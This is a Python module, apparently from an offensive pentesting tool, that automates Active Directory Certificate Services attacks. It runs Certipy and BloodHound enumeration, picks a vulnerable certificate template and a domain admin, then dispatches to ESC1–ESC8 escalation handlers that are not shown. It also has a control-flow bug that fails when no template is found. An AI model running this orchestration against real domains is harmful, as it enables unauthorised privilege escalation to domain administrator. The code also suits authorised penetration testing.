from . import ad_certipy, ad_bloodhound
from general_utils import log_command, current_date


def run_ad_exploit(args):
    selected_template = ad_certipy.find_esc_vulns("ActiveDirectory/ADCS")
    selected_admin = ad_bloodhound.get_domain_admins_from_bloodhound("ActiveDirectory/Bloodhound")
    userSID = ad_bloodhound.get_user_sid("ActiveDirectory/Bloodhound",args.domain_user)
    target = None
    with open(f"ActiveDirectory/ADCS/{current_date}_FindResults.txt") as f:
        for line in f:
            if line.strip().startswith("DNS Name"):
                parts = line.strip().split(":")
                if len(parts) == 2:
                    target = parts[1].strip()
                    break
    
    if selected_template:
        esc_type, template_name, ca_name = selected_template
        esc_key = esc_type.rstrip(":").upper()

        # Dispatch map with wrapper functions that know the correct args
        esc_handlers = {
            "ESC1": ad_certipy.handle_ESC1,
            "ESC2": ad_certipy.handle_ESC2,
            "ESC3": ad_certipy.handle_ESC3,
            "ESC4": ad_certipy.handle_ESC4,
            "ESC5": ad_certipy.handle_ESC5,
            "ESC6": ad_certipy.handle_ESC6,
            "ESC7": ad_certipy.handle_ESC7,
            "ESC8": ad_certipy.handle_ESC8,
        }

    if esc_key in esc_handlers:
        print(f"[+] Running handler for {esc_key}...")
        esc_handlers[esc_key](args, selected_template, selected_admin, target)
    else:
        print(f"[-] No handler defined for {esc_key}")

def run_ad_enum(args):
    ad_certipy.run_certipy_find(args)
    ad_bloodhound.run_bloodhound_collection(args)
    
